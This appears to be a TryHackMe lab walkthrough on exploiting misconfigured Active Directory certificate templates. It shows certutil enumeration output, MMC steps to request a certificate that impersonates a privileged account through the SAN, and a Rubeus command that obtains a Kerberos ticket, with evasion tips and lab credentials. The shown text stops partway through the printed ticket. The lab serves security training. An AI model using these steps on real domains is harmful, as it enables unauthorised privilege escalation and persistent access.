----
Walkthrough on the exploitation of misconfigured AD certificate templates
---

![](https://media.discordapp.net/attachments/937050619674492980/939892264002535444/cert_service.jpg?width=1900&height=300)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/a911b3ab790199d12f39da937fb656aa.png)
###  Introduction

 Start Machine

This room explores the Active Directory Certificate Service (AD CS) and the misconfigurations seen with certificate templates.

Research done and released as a whitepaper by SpecterOps showed that it was possible to exploit misconfigured certificate templates for privilege escalation and lateral movement. Based on the severity of the misconfiguration, it could possibly allow any low-privileged user on the AD domain to escalate their privilege to that of an Enterprise Domain Admin with just a few clicks!

This room provides a walkthrough on how to enumerate misconfigured templates and create a privilege escalation exploit using them. The room is based heavily on the research done by SpecterOps, but only covers a single exploit path for certificates. For more information on AD CS exploitation, please read their [whitepaper](https://posts.specterops.io/certified-pre-owned-d95910965cd2).

Start the VM to begin the room. You will be using RDP to connect, so make sure to either use the THM VPN or AttackBox and then RDP with an RDP client such as Remmina. The following low privileged credentials are provided below. Please allow around 5 minutes for the machine to fully boot.

**Username:** `thm`  

**Password:** `Password1@`

**Domain:** `lunar.eruca.com`  

Answer the questions below

Read the above  

 Completed


### A brief look at certificate templates

Windows Active Directory (AD) is not just for identity and access management but provides a significant amount of services to help you run and manage your organisation. A lot of these services are less commonly known or used, meaning they are often overlooked when security hardening is performed. One of these services is the Active Directory Certificate Services (AD CS).

When talking about certificates, we usually only think about the most common ones, such as those used to upgrade website traffic to HTTPS. But these are usually only used for applications that the organisation exposes to the internet. What about all those applications running on the internal network? Do we now have to give them internet access to allow them to request a certificate from a trusted Certificate Authority (CA)? Well, not really. Cue AD CS.

AD CS is Microsoft's Public Key Infrastructure (PKI) implementation. Since AD provides a level of trust in an organisation, it can be used as a CA to prove and delegate trust. AD CS is used for several things such as encrypting file systems, creating and verifying digital signatures, and even user authentication, which makes it a promising avenue for attackers. What makes it an even more dangerous attack vector, is that certificates can survive credential rotation, meaning even if a compromised account's password is reset, that would do nothing to invalidate the maliciously generated certificate, providing persistent credential theft for up to 10 years! The diagram below shows what the flow for certificate requests and generation looks like (taken from SpecterOps whitepaper):

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6abc4f005b619e77d22020817efcd569.png)  

Since AD CS is such a privileged function, it normally runs on selected domain controllers. Meaning normal users can't really interact with the service directly. On the other side of the coin, organisations tend to be too large to have an administrator create and distribute each certificate manually. This is where certificate templates come in. Administrators of AD CS can create several templates that can allow any user with the relevant permissions to request a certificate themselves. These templates have parameters that say which user can request the certificate and what is required. What SpecterOps has found, was that specific combinations of these parameters can be incredibly toxic and be abused for privilege escalation and persistent access!

Before we dive deeper into certificate abuse, some terminology:

-   PKI - Public Key Infrastructure is a system that manages certificates and public key encryption  
    
-   AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
-   CA - Certificate Authority is a PKI that issues certificates  
    
-   Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA
-   CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate
-   EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used

Answer the questions below

Read the above  

 Completed

What does the user create to ask the CA for a certificate?  

*Certificate Signing Request*

What is the name of Microsoft's PKI implementation?

*Active Directory Certificate Services*


### Certificate template enumeration

The first step in this path is to enumerate all certificate templates to identify vulnerable ones and understand what is required to exploit them.

Luckily, Windows has some awesome built-in tools that can be used to enumerate all certificate templates and their associated policies. The most common approach is to use certutil. If we have access to a domain-joined computer and are authenticated to the domain, we can execute the following command in a cmd window to enumerate all templates and store them in a file:

`certutil -v -template > cert_templates.txt   `

You should get output like this in the textfile:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8c9d6c304e49c30f2b3c4a5b586c4cae.png)  

The command will provide a bunch of output that may be difficult to read, but we are looking for some key indicators that will tell us that one of the templates is vulnerable. In the output, each template is denoted by `Template[X]` where X is the number. This can be used if you want to split the output from a single template.

The specific toxic parameter set that we are looking for is one that has the following:

-   A template where we have the relevant permissions to request the certificate or where we have an account with those permissions
-   A template that allows client authentication, meaning we can use it for Kerberos authentication  
    
-   A template that allows us to alter the subject alternative name (SAN)

**Parameter 1: Relevant Permissions**

We need to have the permissions to generate a certificate request in order for this exploit to work. We are essentially looking for a template where our user has either the _**Allow Enroll**_ or **_Allow Full Control_** permission. You will probably never find a certificate where you have the _Allow Full Control_ permission. However, if you do, congratulations! You can misconfigure the template yourself to make it vulnerable! But for now, let's focus on _Allow Enroll._

It is not as simple as just grepping through the output for the keywords **_Allow Enroll_** and your AD account, since certificate template permissions are in most cases assigned to AD groups, not directly to AD users. So you will have to grep for all **_Allow Enroll_** keywords and review the output to see if any of the returned groups match groups that your user belongs to. If you need to find your own groups, you can use this command:

`net user <username> /domain`  
  
There are two groups that will be fairly common for certificates:

-   Domain Users - This means in most cases that any authenticated users can request the certificate
-   Domain Computers - This means that the machine account of a domain-joined host can request the certificate. If we have admin rights over any machine, we can request the certificate on behalf of the machine account

However, it is usually wise to review all certificate permissions, as it might point you in the direction of an account that will be in your reach to compromise.  

**Parameter 2: Client Authentication**

Once we've shortened the list to certificate templates that we are allowed to request, the next step is to ensure that the certificate has the _**Client Authentication**_ EKU. This EKU means that the certificate can be used for Kerberos authentication. There are other ways to exploit certificates, but for this room, this EKU will be the primary focus.  

Therefore, for now, we are only interested in certificates that allow Client Authentication, meaning the certificate will be granted, given that we are the authenticated user on the machine requesting the certificate.

To find these, we need to review the EKU properties of the template and ensure that the words **_Client Authentication_** is provided. Other templates that do not match this, for now, we can discard.

**Parameter 3: Client Specifies SAN**

Last but definitely not least, we need to verify that the template allows us, the certificate client, to specify the Subject Alternative Name (SAN). The SAN is usually something like the URL of the website that we are looking to encrypt. For example: tryhackme.com. However, if we have the ability to control the SAN, we can leverage the certificate to actually generate a kerberos ticket for any AD account of our choosing!

To find these templates, we grep for the **_CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_** property flag that should be set to 1. This indicates that we can specify the SAN ourselves.

If we find a template where all three of these conditions are met, then we are in business and are a few clicks away from full Enterprise Admin rights! It should be noted that there are other conditions as well, like the fact that we want a certificate that does not go through an approval process to limit human intervention, but the full list of these parameters are not covered here simply because, by default, the initial certification template generation makes the template vulnerable. These additional template restrictions and EKUs are discussed at length in the whitepaper.  

Answer the questions below

```
login using remmina

┌──(witty㉿kali)-[~/Downloads/CVE-2022-26923]
└─$ remmina                                                        
Command 'remmina' not found, but can be installed with:
sudo apt install remmina
Do you want to install it? (N/y)y

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm>cd Desktop

C:\Users\thm\Desktop>certutil -v -template > cert_templates.txt

Name: Active Directory Enrollment Policy
  Id: {163768E2-712B-4E97-A6A3-5E597F91D6F4}
  Url: ldap:
35 Templates:

  Template[0]:
  TemplatePropCommonName = Administrator
  TemplatePropFriendlyName = Administrator
  TemplatePropEKUs =
4 ObjectIds:
    1.3.6.1.4.1.311.10.3.1 Microsoft Trust List Signing
    1.3.6.1.4.1.311.10.3.4 Encrypting File System
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.5.5.7.3.2 Client Authentication

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0
    1: Microsoft Base Cryptographic Provider v1.0

  TemplatePropMajorRevision = 4
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 1
  TemplatePropMinorRevision = 1
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.1.7

  TemplatePropEnrollmentFlags = 29 (41)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)

  TemplatePropSubjectNameFlags = a6000000 (-1509949440)
    CT_FLAG_SUBJECT_ALT_REQUIRE_UPN -- 2000000 (33554432)
    CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL -- 4000000 (67108864)
    CT_FLAG_SUBJECT_REQUIRE_EMAIL -- 20000000 (536870912)
    CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH -- 80000000 (-2147483648)

  TemplatePropPrivateKeyFlags = 10 (16)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0
    TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0

  TemplatePropGeneralFlags = 1023a (66106)
    CT_FLAG_ADD_EMAIL -- 2
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_EXPORTABLE_KEY -- 10 (16)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_DEFAULT -- 10000 (65536)

  TemplatePropSecurityDescriptor = O:S-1-5-21-3330634377-1326264276-632209373-519G:S-1-5-21-3330634377-1326264276-632209373-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;LCRPLORC;;;AU)

    Allow Enroll	LUNAR\Domain Admins
    Allow Enroll	LUNAR\Enterprise Admins
    Allow Full Control	LUNAR\Domain Admins
    Allow Full Control	LUNAR\Enterprise Admins
    Allow Read	NT AUTHORITY\Authenticated Users


  TemplatePropExtensions =
3 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.20.2: Flags = 0, Length = 1c
    Certificate Template Name (Certificate Type)
        Administrator

  Extension[1]:
    2.5.29.37: Flags = 0, Length = 2e
    Enhanced Key Usage
        Microsoft Trust List Signing (1.3.6.1.4.1.311.10.3.1)
        Encrypting File System (1.3.6.1.4.1.311.10.3.4)
        Secure Email (1.3.6.1.5.5.7.3.4)
        Client Authentication (1.3.6.1.5.5.7.3.2)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

  TemplatePropValidityPeriod = 1 Years
  TemplatePropRenewalPeriod = 6 Weeks

  Template[1]:
  TemplatePropCommonName = ClientAuth
  TemplatePropFriendlyName = Authenticated Session
  TemplatePropEKUs =
1 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0
    1: Microsoft Base Cryptographic Provider v1.0
    2: Microsoft Base DSS Cryptographic Provider

  TemplatePropMajorRevision = 3
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 1
  TemplatePropMinorRevision = 1
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.1.4

  TemplatePropEnrollmentFlags = 20 (32)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)

  TemplatePropSubjectNameFlags = 82000000 (-2113929216)
    CT_FLAG_SUBJECT_ALT_REQUIRE_UPN -- 2000000 (33554432)
    CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH -- 80000000 (-2147483648)

  TemplatePropPrivateKeyFlags = 0
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0
    TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0

  TemplatePropGeneralFlags = 10220 (66080)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_DEFAULT -- 10000 (65536)

  TemplatePropSecurityDescriptor = O:S-1-5-21-3330634377-1326264276-632209373-519G:S-1-5-21-3330634377-1326264276-632209373-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;LCRPLORC;;;AU)

    Allow Enroll	LUNAR\Domain Admins
    Allow Enroll	LUNAR\Domain Users
    Allow Enroll	LUNAR\Enterprise Admins
    Allow Full Control	LUNAR\Domain Admins
    Allow Full Control	LUNAR\Enterprise Admins
    Allow Read	NT AUTHORITY\Authenticated Users


  TemplatePropExtensions =
3 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.20.2: Flags = 0, Length = 16
    Certificate Template Name (Certificate Type)
        ClientAuth

  Extension[1]:
    2.5.29.37: Flags = 0, Length = c
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature (80)

  TemplatePropValidityPeriod = 1 Years
  TemplatePropRenewalPeriod = 6 Weeks

  Template[2]:
  TemplatePropCommonName = EFS
  TemplatePropFriendlyName = Basic EFS
  TemplatePropEKUs =
1 ObjectIds:
    1.3.6.1.4.1.311.10.3.4 Encrypting File System

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0
    1: Microsoft Base Cryptographic Provider v1.0

  TemplatePropMajorRevision = 3
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 1
  TemplatePropMinorRevision = 1
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.1.6

  TemplatePropEnrollmentFlags = 29 (41)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)

C:\Users\thm\Desktop>net user thm /domain
User name                    thm
Full Name                    Try THM. Hack Me
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/14/2022 11:54:49 AM
Password expires             Never
Password changeable          1/14/2022 11:54:49 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/16/2023 8:18:23 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Desktop Users
Global Group memberships     *Domain Users
The command completed successfully.


Template[31]:
  TemplatePropCommonName = UserRequest
  TemplatePropFriendlyName = User Request
  TemplatePropEKUs =
3 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.4.1.311.10.3.4 Encrypting File System

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0

  TemplatePropMajorRevision = 64 (100)
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 2
  TemplatePropMinorRevision = a (10)
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.13950390.3651808 User Request

  TemplatePropV1ApplicationPolicy =
3 ObjectIds:
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.4.1.311.10.3.4 Encrypting File System

  TemplatePropEnrollmentFlags = 19 (25)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16)

  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1

  TemplatePropPrivateKeyFlags = 1010010 (16842768)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
    TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
    TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)

  TemplatePropGeneralFlags = 2023a (131642)
    CT_FLAG_ADD_EMAIL -- 2
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_EXPORTABLE_KEY -- 10 (16)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
    CT_FLAG_IS_MODIFIED -- 20000 (131072)

  TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-3330634377-1326264276-632209373-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3330634377-1326264276-632209373-519)(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;AU)(OA;;CR;a05b8cc2-17bc-4802-a710-e7c15ab866a2;;AU)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3330634377-1326264276-632209373-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;LCRPLORC;;;AU)

    Allow Enroll	LUNAR\Domain Admins
    Allow Enroll	LUNAR\Domain Users
    Allow Enroll	LUNAR\Enterprise Admins
    Allow Enroll	NT AUTHORITY\Authenticated Users
    Allow Auto-Enroll	NT AUTHORITY\Authenticated Users
    Allow Full Control	LUNAR\Domain Admins
    Allow Full Control	LUNAR\Enterprise Admins
    Allow Full Control	LUNAR\Administrator
    Allow Read	NT AUTHORITY\Authenticated Users


  TemplatePropExtensions =
4 Extensions:

  Extension[0]:
    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 31
    Certificate Template Information
        Template=User Request(1.3.6.1.4.1.311.21.8.13251815.15344444.12602244.3735211.11040971.202.13950390.3651808)
        Major Version Number=100
        Minor Version Number=10

  Extension[1]:
    2.5.29.37: Flags = 0, Length = 22
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)
        Secure Email (1.3.6.1.5.5.7.3.4)
        Encrypting File System (1.3.6.1.4.1.311.10.3.4)

  Extension[2]:
    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

  Extension[3]:
    1.3.6.1.4.1.311.21.10: Flags = 0, Length = 28
    Application Policies
        [1]Application Certificate Policy:
             Policy Identifier=Client Authentication
        [2]Application Certificate Policy:
             Policy Identifier=Secure Email
        [3]Application Certificate Policy:
             Policy Identifier=Encrypting File System

  TemplatePropValidityPeriod = 1 Years
  TemplatePropRenewalPeriod = 6 Weeks

```

What AD group will allow all AD user accounts to request a certificate?  

*Domain Users*


What AD group will allow all domain-joined computers to request a certificate?  

*Domain Computers*


Which EKU allows us to use the generated certificate for Kerberos authentication?  

*Client Authentication*


Which certificate template is misconfigured based on the three provided parameters?

*User Request*

### Generating a malicious certificate

Now that we identified a certificate template that we can exploit, it is time to generate the certificate request. You could do this step from the command line if you wanted to, but why make your life difficult when Microsoft just allows you to do hacking through the click of some buttons!

To request a new certificate, we will use the Microsoft Management Console. Load up the console by typing _**mmc**_ in a run window:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/62ddbaea280193db14af0a9344238fd7.png)  

This will bring up the MMC window. In this window, click **File -> Add/Remove Snap-in...**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a5fbd1d925d9c1324cfc96cdd476e433.png)

In this window, you want to add the **Certificates** snap-in:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/1f56997d4b22983b9dea48464fa6a8db.png)

Although it will add the snap-in directly if you had administration privileged, you would see the next prompt:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/70a553f60b4918a3071ead1916e5845d.png)  

This prompt allows you to impersonate service accounts or the machine account. But you can only perform these options if you have administration privileges on the host, which we currently don't have. You can now close the snap-in manager and return to the main console screen. Expand the **Certificates** option, right-click on **Personal**, select **All Tasks**, and click on **Request New Certificate**:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/2d39a4eb6c2b2cd58bb56fff09abde75.png)

For the first option, just select **Next** twice, since we are using the default CA, you should see the following screen showing available templates:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/47d5d47980bf91b677d875f437c74469.png)  

As you can see from the screen, we need to complete the information for our certificate before we can enroll it. Click the "More information is required to enroll this certificate." link to start the process.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/225936c84f0ed2c8a2fe15c52a1960f1.png)

On this screen, we need to be very specific about the information that we provide. In order to ensure that the certificate can be exploited for a Kerberos ticket of a privileged user, we require the User Principal Name of the user we wish to impersonate. This can be found using the AD-RSAT tools or something like the PowerView scripts.

For this example, we will impersonate one of the DA users in this domain. Let's target the _**svc.gitlab**_ account since it is a service account, meaning Kerberos authentication is likely expected from this account. The UPN of this account is **svc.gitlab@lunar.eruca.com**. Using this information we can complete the certificate properties.

First, we change the **Subject name** Type to **Common Name** and provide the name we want for this certificate. Then, we alter the **Alternative name** Type to **User principal name** and provide the UPN of the account we want to impersonate. The values should look like this:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/31f93460740cead5c6ce6e5866179811.png)

We can then add these properties to our certificate:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/7d7374aaa95f5d957afb06b81b399746.png)

When we click okay, we will now see that we are allowed to enroll this certificate:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/2c8bc43dc7668685348047f862a0f4d5.png)  

Complete the enrollment of the certificate. Once enrolled you will be able to view the certificate under your personal certificates:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d9bd287ce14470e92ff4c135c8ea211.png)

If we review the details of the certificate, you will see that the SAN now specifies the UPN we want to impersonate, definitely not the SAN of our web server!

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/74180544793b0cc3145b5b622511eef0.png)

Congratulations, you have just generated a certificate that will provide you with persistent authentication to the domain for the next two years! The last step is to actually export the certificate to get it ready for use. Right-click on the certificate, select **All Tasks,** and then **Export**:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/77ed2068688fdd36af550a404f222768.png)

Follow the prompts but make sure to export the private key as well:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/057502d0e144ca40907e79b8c046c009.png)

The certificate should be in pfx format. Furthermore, configure a password for the certificate to ensure the private key is exported:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/ff46b7fa062164b5488b1648e18adee3.png)

Select a filename and export the certificate:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/24d0b97ea00dcb4d75a5c0f60b744d75.png)

Now your certificate is ready for exploitation!  

Answer the questions below

```

```

![[Pasted image 20230216162756.png]]
![[Pasted image 20230216164950.png]]
![[Pasted image 20230216165250.png]]

In which field do we inject the User Principal Name of the account we want to impersonate?  

Called SAN for short

*Subject Alternative Name*

If we had administrative access, when adding the snap-in, which option would we select to use the machine account of the host instead of our authenticated AD account for certificate generation?  

You make this selection when prompted: "This snap-in will always manage certificates for:"

*Computer Account*

Follow the steps above and generate your very own privilege escalation certificate  

 Completed


### User impersonation through a certificate

Now we can finally impersonate a user. To perform this, two steps are required:

-   Use the certificate to request a Kerberos ticket granting ticket (TGT)  
    
-   Load the Kerberos TGT into your hacking platform of choice

For the first step, we will be using [Rubeus](https://github.com/GhostPack/Rubeus). An already compiled version is available in the `C:\THMTools\` directory. Open a command prompt window and navigate to this directory. We will use the following command to request the TGT:

`Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:`  

Let's break down the parameters:

-   **/user** - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
-   **/enctype** -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
-   **/certificate** - Path to the certificate we have generated
-   **/password** - The password for our certificate file
-   **/outfile** - The file where our TGT will be output to
-   **/domain** - The FQDN of the domain we are currently attacking
-   **/dc** - The IP of the domain controller where we are requesting the TGT from. Usually it is best to select a DC that has a CA service running

Once we execute the command, we should receive our TGT:

TGT Request

```shell-session
C:\THMTools> .\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.69.219
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.0.0
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             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
